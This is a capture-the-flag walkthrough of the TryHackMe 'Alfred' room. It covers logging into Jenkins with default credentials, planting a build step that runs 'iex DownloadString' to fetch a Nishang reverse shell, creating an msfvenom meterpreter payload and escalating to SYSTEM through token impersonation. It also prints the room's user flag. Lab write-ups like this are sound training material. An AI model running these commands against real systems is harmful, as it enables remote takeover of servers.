# Alfred on TryHackMe

Room [Alfred](https://tryhackme.com/room/alfred)

#

<h3>Make a Directory with the Room Name in the TryHackMe Folder</h3>

- Change directory to /Desktop/Tryhackme.

`cd Desktop/Tryhackme`

- Change a new directory call "Alfred".

`mkdir Alfred`

- Change directory into Alfred.

`cd Alfred/`

<p align="center"> <img src="https://i.imgur.com/JfDQGWn.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Deploy the Machine</h3>

Deploy the machine by connecting to TryHackMe network. 

Temporary IP Address: [10.10.198.142]

Introduction: 
In this session, we'll discover how to take advantage of a common mistake in a popular automation server called Jenkins. Jenkins is a tool that helps developers automatically deploy their code when they make changes. We'll explore a specific misconfiguration in Jenkins and then use a cool method to increase our system access.

Because Jenkins runs on Windows, we'll rely on a tool called Nishang to start things off. Nishang provides a bunch of helpful scripts for getting initial access, figuring out what's on the system, and boosting our privileges. In this scenario, we'll specifically use scripts that create reverse shells, allowing us to gain control.

# 

# Initial Access Questions

Question 1: How many ports are open? (TCP only)

Question 2: What is the username and password for the login panel? (in the format username:password)

Question 3: What is the user.txt flag? 

#

# Question 1

<h3>Reconnaissance</h3>

Gather the Information from the Target Machine with `Nmap` Command. Find the open ports on the machine.

On Terminal: `nmap -sC -sV -oN nmap_initial.txt 10.10.198.142`

- `nmap`: This is the command used to run the Nmap tool.
- `-sC`: To perform script scanning.
- `-sV`: To detect the version of services.
- `-oN nmap_initial.txt`: To save the scan results in a file named "nmap_initial.txt."
- The target IP address is `10.10.225.162`.

<p align="center"> <img src="https://i.imgur.com/KGKrnuy.png" height="90%" width="90%" alt=""/>

Question 1: How many ports are open? (TCP only)

`3`

#

# Question 2

Navigate to 10.10.198.142 on browser.
- Nothing really special was found.

<p align="center"> <img src="https://i.imgur.com/zPbi2cf.png" height="90%" width="90%" alt=""/>

Since we found another HTTP port (8080) with nmap, we will navigate to 10.10.198.142:8080 on browser.
- Sign in page Jenkins was found.

<p align="center"> <img src="https://i.imgur.com/pSOhBf1.png" height="90%" width="90%" alt=""/>

During a CTF session, when we go on a login webpage, try the default username and password.
- Google: Jenkins default username and password.

<p align="center"> <img src="https://i.imgur.com/x6nUawI.png" height="90%" width="90%" alt=""/>

I tried the admin:password but it didn't work so I tried admin:admin as password and it worked.

<p align="center"> <img src="https://i.imgur.com/DRSN9Rq.png" height="90%" width="90%" alt=""/>

Question 2: What is the username and password for the login panel? (in the format username:password)

`admin:admin`

#

# Question 3

Navigate to https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 
- To download: Nishang reverse shell scripts

Open up the reverse shell scripts that you just downloaded and edit:
- Navigate to the bottom of the script
- Add: `Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port`
- My case: `Invoke-PowerShellTcp -Reverse -IPAddress 10.6.106.187 -Port 1202`
- Save it and Exit out.

<p align="center"> <img src="https://i.imgur.com/T97QXaU.png" height="90%" width="90%" alt=""/>

We will need to make it available for the server to download. By creating an http server with python.

Open another terminal, we will need to use the ncat command to listen for connection on port 1202.

On Terminal: `python3 -m http.server 80`
On New Terminal: `ncat -nlvp 1202`

<p align="center"> <img src="https://i.imgur.com/YKa2lml.png" height="90%" width="90%" alt=""/>

Navigate back to the Jenkins webpage > Click on the down arrow on "project" > Select "Configure".

<p align="center"> <img src="https://i.imgur.com/FE8WBan.png" height="90%" width="90%" alt=""/>

Scroll down to Build section and put in: `powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.106.187:80/Invoke-PowerShellTcp.ps1') ` > Save.

- IEX stands for invoke expression which will evaluate and load whatever is passed onto it, which in this case is the Invoke-PowerShellTcp.ps1 script.

- IP is your own IP Address with port 80.

<p align="center"> <img src="https://i.imgur.com/kiyh9FC.png" height="90%" width="90%" alt=""/>

Click on "Build Now" > Build History will change.

<p align="center"> <img src="https://i.imgur.com/doZPaha.png" height="90%" width="90%" alt=""/>

Successully got into Jenkins workspace with `ncat`.

<p align="center"> <img src="https://i.imgur.com/6Z2qKho.png" height="90%" width="90%" alt=""/>

Let's go back in directories by using `cd`.

On Terminal: `cd ../../../..`

<p align="center"> <img src="https://i.imgur.com/PE1SLIz.png" height="90%" width="90%" alt=""/>

We will find the user and get into their desktop.

<p align="center"> <img src="https://i.imgur.com/TtmtPiH.png" height="90%" width="90%" alt=""/>

We will now use `ls` to see what file the user has.

<p align="center"> <img src="https://i.imgur.com/m0fxqex.png" height="90%" width="90%" alt=""/>

Look into the "user.txt" by using `type` command.
- Successfully captured the flag.

<p align="center"> <img src="https://i.imgur.com/tTL3FBC.png" height="90%" width="90%" alt=""/>

Question 3: What is the user.txt flag? 

`79007a09481963edf2e1321abd9ae2a0`

#

# Switching Shells Questions

Question 1: What is the final size of the exe payload that you generated?

#

# Question 1

To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create a Windows meterpreter reverse shell using the following payload:

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`

For my case: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.106.187 LPORT=1337 -f exe -o ExploitShell.exe`

- LHOST = your own IP Address.
- LPORT = can be any port that is unuse.
- shell-name = any shell name.

Open up a new terminal and run the msfvenom above.

<p align="center"> <img src="https://i.imgur.com/uFhN1jS.png" height="90%" width="90%" alt=""/>

After creating this payload, download it to the bruce's machine using the same method in the previous step:

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"`

For my case: `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.106.187:80/ExploitShell.exe','ExploitShell.exe')"`

On Bruce's Terminal run the command above.
- We can see that it's on bruce's desktop with `ls` command.

<p align="center"> <img src="https://i.imgur.com/neHJFSW.png" height="90%" width="90%" alt=""/>

Before running the exploit, we have to ensure the handler is set up in Metasploit.

- On Terminal open up Metasploit with: `msfconsole`.
- After Metasploit is running type in: `use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp`.
- Set LHOST to your IP address: `set LHOST 10.6.106.187`.
- Set LPORT to the same port you used for payload: `set LPORT 1337`.
- Run the exploit: `run`.

<p align="center"> <img src="https://i.imgur.com/TgJI1jD.png" height="90%" width="90%" alt=""/>

On bruce's desktop terminal, run the "ExploitShell.exe".

<p align="center"> <img src="https://i.imgur.com/RyJLlzy.png" height="90%" width="90%" alt=""/>

Successfully got in the meterpreter shell.

<p align="center"> <img src="https://i.imgur.com/aDHXak4.png" height="90%" width="90%" alt=""/>

Question 1: What is the final size of the exe payload that you generated?

`73802`

<p align="center"> <img src="https://i.imgur.com/otud9R0.png" height="90%" width="90%" alt=""/>

#

# Privilege Escaltion Question

Question 1: What is the output when you run the getuid command?

Question 2: Read the root.txt file located at C:\Windows\System32\config

# Question 1

We will view all the privileges using `whoami /priv` on powershell terminal.

<p align="center"> <img src="https://i.imgur.com/K53OOsL.png" height="90%" width="90%" alt=""/>

We can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability.

Enter: `load incognito` to load the incognito module in Metasploit. 

<p align="center"> <img src="https://i.imgur.com/Xdvl2ha.png" height="90%" width="90%" alt=""/>

To check which tokens are available, enter: `list_tokens -g`.
- We can see that the BUILTIN\Administrators token is available.

<p align="center"> <img src="https://i.imgur.com/bCDbKGV.png" height="90%" width="90%" alt=""/>

Use the `impersonate_token "BUILTIN\Administrators"` command to impersonate the Administrators' token.

<p align="center"> <img src="https://i.imgur.com/9p8PtQ8.png" height="90%" width="90%" alt=""/>

Question 1: What is the output when you run the `getuid` command?

`NT AUTHORITY\SYSTEM`

<p align="center"> <img src="https://i.imgur.com/oUPZu4h.png" height="90%" width="90%" alt=""/>

#

# Question 2

Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).

The safest process to pick is the services.exe process.

First, use the `ps` command to view processes and find the PID of the services.exe process. 

<p align="center"> <img src="https://i.imgur.com/jH5HEAe.png" height="90%" width="90%" alt=""/>

Migrate to this process using the command `migrate PID-OF-PROCESS`.
- Successfully mirgated to PID 668.

<p align="center"> <img src="https://i.imgur.com/kOPbDll.png" height="90%" width="90%" alt=""/>

Type in shell > Navigate to C:\Windows\System32\config > read "root.txt".

<p align="center"> <img src="https://i.imgur.com/4US07xK.png" height="90%" width="90%" alt=""/>


